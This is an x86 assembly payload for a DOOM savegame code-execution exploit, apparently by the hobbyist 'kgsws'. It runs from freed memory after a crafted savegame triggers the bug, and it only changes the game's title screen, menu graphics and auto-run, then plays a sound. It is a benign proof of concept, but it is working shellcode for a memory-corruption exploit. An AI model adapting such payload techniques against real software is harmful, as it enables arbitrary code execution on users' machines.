// kgsws' DOOM code execution
// - this code is executed after triggering the exploit
// - this code is executed as a PSPR action code pointer
// - this code is running from memory block allocated but already freed by ZONE
// - this source only contains payload, you still need exploited savegame file
//
// %eax - pointer to players[] structure array
// %edx - pointer to pspdef_t in player structure

.section .text
.globl _start

_start:
	// get CODE base
	mov	(%esp),%edx
	sub	$0x2D1D5,%edx
	// get DATA base
	sub	$0x2B24C,%eax
	// backup stack
	pusha

	//
	// NOTE
	// everything here is just a quick example

	// set gamestate to GS_DEMOSCREEN
	mov	$3,%ebx
	mov	%ebx,0x2B7C8(%eax)
	// delay demosequence
	xor	%ebx,%ebx
	mov	%ebx,0x2A760(%eax)
	mov	$350,%ebx
	mov	%ebx,0x2A754(%eax)

	// change TITLEPIC
	mov	$0x21618,%ebx
	add	%eax,%ebx
	mov	%ebx,0x1d730(%edx)	// pagename =
	mov	%ebx,0x1d7cd(%edx)	// pagename =
	mov	%ebx,0x2a75c(%eax)	// *pagename

	// change menu 'skull' selector
	// (in a very inefficient way, i know)
	mov	$0x4f465453,%ebx
	mov	%ebx,0x12226(%eax)
	mov	$0x30484355,%ebx
	mov	%ebx,0x1222a(%eax)
	mov	$0x45465453,%ebx
	mov	%ebx,0x1222e(%eax)
	mov	$0x00304c56,%ebx
	mov	%ebx,0x12232(%eax)

	// reverse 'run key' logic (auto run)
	mov	$0x01,%bl
	mov	%bl,0x1fbe5(%edx)

	// enable menu
	push	%eax
	push	%edx
	mov	$0x23D10,%ebx
	add	%edx,%ebx
	call	*%ebx
	pop	%edx
	pop	%eax

	// start sound
	push	%eax
	push	%edx
	mov	$0x3f560,%ecx
	add	%edx,%ecx
	xor	%ebx,%ebx
	mov	$58,%edx
	call	*%ecx
	pop	%edx
	pop	%eax

	// continue the game
	popa
	ret
